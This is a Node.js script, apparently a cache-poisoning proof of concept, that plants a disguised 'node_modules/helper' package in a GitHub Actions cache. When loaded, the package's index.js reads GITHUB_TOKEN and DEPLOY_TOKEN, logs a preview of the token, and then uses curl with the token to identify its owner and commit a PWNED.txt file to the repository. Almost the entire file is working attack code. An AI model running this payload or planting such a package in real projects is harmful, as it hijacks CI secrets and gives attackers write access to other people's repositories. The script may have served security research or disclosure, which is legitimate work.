const fs = require('fs');
const path = require('path');

const dir = path.join('node_modules', 'helper');
fs.mkdirSync(dir, { recursive: true });

// Payload que corre en victim.yml con GITHUB_TOKEN + DEPLOY_TOKEN
const payload = [
  "const {execSync}=require('child_process');",
  "const gt=process.env.GITHUB_TOKEN||'';",
  "const dt=process.env.DEPLOY_TOKEN||'';",
  "const repo=process.env.GITHUB_REPOSITORY||'';",
  "console.log('');",
  "console.log('=== CACHE POISON: GITHUB_TOKEN CAPTURED ===');",
  "console.log('GITHUB_REPOSITORY: '+repo);",
  "console.log('GITHUB_TOKEN length: '+gt.length);",
  "console.log('DEPLOY_TOKEN length: '+dt.length);",
  "console.log('GITHUB_TOKEN preview: '+gt.substring(0,10)+'...');",
  "try{",
  "  var me=execSync('curl -sf -H \"Authorization: token '+gt+'\" https://api.github.com/user').toString();",
  "  var u=JSON.parse(me);",
  "  console.log('TOKEN IDENTITY: '+u.login+' id='+u.id);",
  "  var c=Buffer.from('PWNED '+new Date().toISOString()).toString('base64');",
  "  var res=execSync('curl -sf -X PUT -H \"Authorization: token '+gt+'\" -H \"Content-Type: application/json\" https://api.github.com/repos/'+repo+'/contents/PWNED.txt -d \'{\"message\":\"cache-poison-proof\",\"content\":\"'+c+'\"}\' ').toString();",
  "  var j=JSON.parse(res);",
  "  if(j.content) console.log('REPO WRITE SUCCESS: '+j.content.html_url);",
  "  else console.log('write: '+JSON.stringify(j).substring(0,100));",
  "}catch(e){console.log('exec error: '+e.message.substring(0,100));}",
  "console.log('===========================================');",
  "console.log('');",
].join("\n");

fs.writeFileSync(path.join(dir,'index.js'), payload);
fs.writeFileSync(path.join(dir,'package.json'), JSON.stringify({name:'helper',version:'1.0.0',main:'index.js'}));

console.log('[v3] node_modules/helper created');
console.log('[v3] files:', fs.readdirSync(dir));
